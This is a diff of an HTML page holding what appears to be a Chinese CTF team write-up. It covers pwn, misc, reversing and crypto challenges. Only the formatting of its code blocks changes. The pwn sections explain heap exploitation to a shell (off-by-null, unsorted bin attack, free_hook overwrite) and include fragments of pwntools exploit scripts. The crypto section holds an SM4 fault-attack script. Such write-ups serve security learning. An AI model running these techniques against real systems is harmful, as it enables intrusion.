 再调用ret。很明显一个基于vm的栈溢出（指溢出vm的栈跳vm的code
 然后回check这个偏移不大于0x1000，也就是跳不出code区，只能用程序原本就带的code来执行。我们写入不了opcode。
@@ -996,40 +647,7 @@
 人肉识别下来是有了syscall的所有调用//0x8 0x9 0xa
 以及能控制所有的syscall所需要的参数。//a1[0] a1[1] a1[2] a1[3]
 之后用程序自带的orw功能去搞就行。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">=</span><span class="n">chr</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span><span class="o">+</span><span class="n">chr</span><span class="p">(</span><span class="mh">0x57</span><span class="p">)</span><span class="o">+</span><span class="n">chr</span><span class="p">(</span><span class="mh">0x51</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">i</span><span class="o">=</span><span class="mi">0</span>
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gd</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">):</span>
@@ -1058,71 +676,12 @@
 </span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;./flag&#39;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="direct">direct</h3>
+</span></span></code></pre></div><h3 id="direct">direct</h3>
 <p>负数溢出，在edit的时候，offset可以为负数，这种情况下可以去修改chunk的size以及向上修改很长的区域。
 但没有leak函数。打stdout因为没有任何跟io有关的操作也实现不了。
 在readdir那边的操作时候，可以先readdir完随后通过修改size分配unsorted bin去写入libc地址，然后给下一个将被readdir给读取出来的字符串连起来。
 最后一发入魂。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import*
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import*
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">def menu(ch):
 </span></span><span class="line"><span class="cl">	r.sendlineafter(&#39;Your choice: &#39;,str(ch))
@@ -1175,100 +734,9 @@
 </span></span><span class="line"><span class="cl">add(6,0x90)
 </span></span><span class="line"><span class="cl">edit(6,0,0x10,p64(lbase+libc.symbols[&#39;system&#39;]))
 </span></span><span class="line"><span class="cl">r.interactive()
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="easypwn">easypwn</h3>
+</span></span></code></pre></div><h3 id="easypwn">easypwn</h3>
 <p>首先一个off by null 可以构造一个堆块重叠,然后爆破半个字节并利用unsorted bin attack 攻击 global_max_fast,之后则是一个 free对应大小的块 越界后覆盖stdout的read_end 和 write_ptr指针,并令覆盖的内容相同 即可 leak libc_base,之后则是一个攻击 malloc_hook写入rce的ez操作</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span><span class="lnt">84
-</span><span class="lnt">85
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import*
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import*
 </span></span><span class="line"><span class="cl">#context.log_level =&#39;DEBUG&#39;
 </span></span><span class="line"><span class="cl">def menu(ch):
 </span></span><span class="line"><span class="cl">	p.sendlineafter(&#39;Your choice:&#39;,str(ch))
@@ -1353,72 +821,9 @@
 </span></span><span class="line"><span class="cl">		p.close()
 </span></span><span class="line"><span class="cl">		continue
 </span></span><span class="line"><span class="cl">p.interactive()
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="oldschool">oldschool</h3>
+</span></span></code></pre></div><h3 id="oldschool">oldschool</h3>
 <p>审计一下给的源文件即可知道,在mmap_edit中因为 &lt; 和 &gt; 符号搞错了,导致越界,往一个地址写入一个64位长的整型变量,此时只需要leak libc,然后计算出此偏移,因为mmap_edit时的指针类型为int类型,所以 需要之前 offset&raquo;2 才是正确的offset,之后就是往free_hook写入一个system,free(&rsquo;/bin/sh&rsquo;)即可getshell</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import*
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import*
 </span></span><span class="line"><span class="cl">context.log_level =&#39;DEBUG&#39;
 </span></span><span class="line"><span class="cl">def menu(ch):
 </span></span><span class="line"><span class="cl">	p.sendlineafter(&#39;Your choice:&#39;,str(ch))
@@ -1475,9 +880,7 @@
 </span></span><span class="line"><span class="cl">free(1)
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">p.interactive()
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="misc">Misc</h2>
+</span></span></code></pre></div><h2 id="misc">Misc</h2>
 <h3 id="miscstudy">miscstudy</h3>
 <p><img src="https://hackmd.summershrimp.com/uploads/upload_6a55e4763ec72134b9c0b3d913bd724b.png" alt=""></p>
 <p>找到一个访问 http://39.99.247.28/fonts/1 的流量</p>
@@ -1492,29 +895,7 @@
 <p>解码得到level3_start_it</p>
 <p><img src="https://hackmd.summershrimp.com/uploads/upload_d88a9c7631f80aee514a93c951730a2b.png" alt=""></p>
 <p>在文件末尾的上面，也能发现3串base64编码后的字符串，对其分别解码后得到一串长度为3600的01字符串，按照每60个一行，可以得到一个二维码：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">x</span> <span class="o">=</span> <span class="mi">60</span>
 </span></span><span class="line"><span class="cl"><span class="n">y</span> <span class="o">=</span> <span class="mi">60</span>
@@ -1532,30 +913,18 @@
 </span></span><span class="line"><span class="cl">            <span class="n">img</span><span class="o">.</span><span class="n">putpixel</span><span class="p">((</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">),</span> <span class="n">black</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">            
 </span></span><span class="line"><span class="cl"><span class="n">img</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://hackmd.summershrimp.com/uploads/upload_abea5644a517e71dffcdda7ab5957760.png" alt=""></p>
+</span></span></code></pre></div><p><img src="https://hackmd.summershrimp.com/uploads/upload_abea5644a517e71dffcdda7ab5957760.png" alt=""></p>
 <p>扫描得到
 链接：https://pan.baidu.com/s/1wVJ7d0RLW8Rj-HOTL9Shug 提取码：1lms</p>
 <p>下载得到level4.zip</p>
 <p><img src="https://hackmd.summershrimp.com/uploads/upload_4a982fd6cd1c6c0e6ea0ff6ead63c099.png" alt=""></p>
 <p>stegbreak，密码power123</p>
 <p>JPHS提取得到</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://pan.baidu.com/s/1o43y4UGkm1eP-RViC25aOw
 </span></span><span class="line"><span class="cl">mrpt
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">level4_here_all
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://hackmd.summershrimp.com/uploads/upload_1f8f684177225795f5167bf2a7a69080.png" alt=""></p>
+</span></span></code></pre></div><p><img src="https://hackmd.summershrimp.com/uploads/upload_1f8f684177225795f5167bf2a7a69080.png" alt=""></p>
 <p>level5_is_aaa</p>
 <p>level6.zip中有3个txt文件，crc爆破得到level6_isready</p>
 <p>level7.zip明文碰撞1.png，再水印隐写可以得到level7ishere和39.99.247.28/final_level/</p>
@@ -1566,60 +935,7 @@
 <h2 id="rev">Rev</h2>
 <h3 id="xx_warmup_obf">xx_warmup_obf</h3>
 <p>ELF逆向，里面全是混淆，使用pin改了一个插件出来，可以用来统计运行过的指令地址，编写idapython，将未运行的指令patch成nop，可以看到程序多了很多函数，大概流程就是：输入，判断长度28，然后进入到一个解方程的地方，解方程即可</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># -*- coding: UTF-8 -*-
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># -*- coding: UTF-8 -*-
 </span></span><span class="line"><span class="cl">from z3 import *
 </span></span><span class="line"><span class="cl">s = Solver()
 </span></span><span class="line"><span class="cl">key = [BitVec(&#39;%d&#39;%i,8) for i in range(28)]
@@ -1668,48 +984,9 @@
 </span></span><span class="line"><span class="cl">        flag += chr(result[key[i]].as_long().real)
 </span></span><span class="line"><span class="cl">    print flag
 </span></span><span class="line"><span class="cl">    print len(&#39;flag{g0_Fuck_xx_5egm3nt&#39;)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="imitation_game">imitation_game</h3>
+</span></span></code></pre></div><h3 id="imitation_game">imitation_game</h3>
 <p>fork后子进程是一个CBC AES，正确后，父进程启动了一个chip8程序，这里的字节码进行过更改，打log后，分析，是一个</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">v0
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">v0
 </span></span><span class="line"><span class="cl">+2
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">v1
@@ -1742,37 +1019,14 @@
 </span></span><span class="line"><span class="cl">*************
 </span></span><span class="line"><span class="cl">v9
 </span></span><span class="line"><span class="cl">+2
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>先对输入做上面的操作
+</span></span></code></pre></div><p>先对输入做上面的操作
 然后进入27a这个乘法
 俩个参数，一个输入一个乘法系数
 1 2 1
 2 1 1
 1 2 2
 系输如上，三组循环，解方程即可</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># -*- coding: UTF-8 -*-
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># -*- coding: UTF-8 -*-
 </span></span><span class="line"><span class="cl">from z3 import *
 </span></span><span class="line"><span class="cl">s = Solver()
 </span></span><span class="line"><span class="cl">key = [BitVec(&#39;%d&#39;%i,8) for i in range(3)]
@@ -1789,9 +1043,7 @@
 </span></span><span class="line"><span class="cl">    flag += str(hex(aaa[i]).replace(&#39;0x&#39;,&#39;&#39;))
 </span></span><span class="line"><span class="cl">flag += &#39;}&#39;
 </span></span><span class="line"><span class="cl">print flag
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>算出来是a2def12c13</p>
+</span></span></code></pre></div><p>算出来是a2def12c13</p>
 <h2 id="crypto">Crypto</h2>
 <h3 id="fault">fault</h3>
 <p>differential fault attack SM4</p>
@@ -1830,212 +1082,7 @@ f_byte: fault input byte</p>
 <p>key schedule可逆，能通过这最后4轮的子密钥直接搞到master key</p>
 <p>最后解密，getflag</p>
 <p>脚本很乱：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span><span class="lnt">122
-</span><span class="lnt">123
-</span><span class="lnt">124
-</span><span class="lnt">125
-</span><span class="lnt">126
-</span><span class="lnt">127
-</span><span class="lnt">128
-</span><span class="lnt">129
-</span><span class="lnt">130
-</span><span class="lnt">131
-</span><span class="lnt">132
-</span><span class="lnt">133
-</span><span class="lnt">134
-</span><span class="lnt">135
-</span><span class="lnt">136
-</span><span class="lnt">137
-</span><span class="lnt">138
-</span><span class="lnt">139
-</span><span class="lnt">140
-</span><span class="lnt">141
-</span><span class="lnt">142
-</span><span class="lnt">143
-</span><span class="lnt">144
-</span><span class="lnt">145
-</span><span class="lnt">146
-</span><span class="lnt">147
-</span><span class="lnt">148
-</span><span class="lnt">149
-</span><span class="lnt">150
-</span><span class="lnt">151
-</span><span class="lnt">152
-</span><span class="lnt">153
-</span><span class="lnt">154
-</span><span class="lnt">155
-</span><span class="lnt">156
-</span><span class="lnt">157
-</span><span class="lnt">158
-</span><span class="lnt">159
-</span><span class="lnt">160
-</span><span class="lnt">161
-</span><span class="lnt">162
-</span><span class="lnt">163
-</span><span class="lnt">164
-</span><span class="lnt">165
-</span><span class="lnt">166
-</span><span class="lnt">167
-</span><span class="lnt">168
-</span><span class="lnt">169
-</span><span class="lnt">170
-</span><span class="lnt">171
-</span><span class="lnt">172
-</span><span class="lnt">173
-</span><span class="lnt">174
-</span><span class="lnt">175
-</span><span class="lnt">176
-</span><span class="lnt">177
-</span><span class="lnt">178
-</span><span class="lnt">179
-</span><span class="lnt">180
-</span><span class="lnt">181
-</span><span class="lnt">182
-</span><span class="lnt">183
-</span><span class="lnt">184
-</span><span class="lnt">185
-</span><span class="lnt">186
-</span><span class="lnt">187
-</span><span class="lnt">188
-</span><span class="lnt">189
-</span><span class="lnt">190
-</span><span class="lnt">191
-</span><span class="lnt">192
-</span><span class="lnt">193
-</span><span class="lnt">194
-</span><span class="lnt">195
-</span><span class="lnt">196
-</span><span class="lnt">197
-</span><span class="lnt">198
-</span><span class="lnt">199
-</span><span class="lnt">200
-</span><span class="lnt">201
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">Counter</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">Counter</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
@@ -2236,9 +1283,7 @@ f_byte: fault input byte</p>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>但是能getflag：</p>
+</span></span></code></pre></div><p>但是能getflag：</p>
 <p><img src="https://hackmd.summershrimp.com/uploads/upload_80b51b89dfd332c4c8c86c69fe16698d.png" alt=""></p>
 <h3 id="modestudy">modestudy</h3>
 <p>第一关 cbc bit flip，把第一块密文的最后一字节xor上0x1即可</p>
@@ -2251,206 +1296,7 @@ f_byte: fault input byte</p>
 <p>第四关 低配版 BEAST Attack</p>
